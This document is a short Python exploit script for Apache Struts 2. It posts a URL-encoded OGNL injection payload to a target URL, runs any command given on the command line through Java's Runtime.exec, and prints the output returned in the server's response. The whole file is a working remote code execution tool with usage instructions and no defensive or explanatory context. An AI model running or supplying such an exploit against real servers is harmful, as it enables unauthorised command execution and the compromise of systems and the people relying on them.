import requests
import sys
 
def payload(url,cmd):

    exploit = "method:%23_memberAccess%3d%40ognl%20.%20OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command="+cmd

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    request = requests.post(url, data=exploit, headers=headers)
    print(request.text)
    print(request.url)
 
if len(sys.argv) < 3:
    print ('[*] Use: python struts2.py URL COMMAND')
    exit(0)
else:
    url = sys.argv[1]
    cmd = sys.argv[2]
    payload(url,cmd)
